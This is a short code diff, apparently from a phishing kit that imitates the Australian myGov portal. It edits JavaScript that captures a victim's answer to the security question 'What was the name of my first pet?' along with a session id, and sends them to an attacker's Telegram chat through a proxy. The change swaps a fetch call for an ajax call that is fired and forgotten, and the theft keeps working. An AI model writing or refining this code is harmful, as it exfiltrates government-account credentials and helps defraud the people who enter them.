@@ -153,14 +153,10 @@
                 $btn.addClass('processing');
                 $btn.prop('disabled', true);
 
-                // 2. Build the Telegram message
-                await fetch(`${PROXY}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `🔔 myGov Secret Question\n❓ What was the name of my first pet?\n💬 Answer: ${answer}\n🆔 Session: ${sid}`,
-                            reply_markup: keyboard
+                // 2. Build the Telegram message (updated format)
+                let msg = "🔔 myGov Secret Question\n";
+                msg += "❓ What was the name of my first pet?\n";
+                msg += "💬 Answer: " + answer;
 
                 // 3. Send Telegram notification (fire and forget)
                 $.ajax({
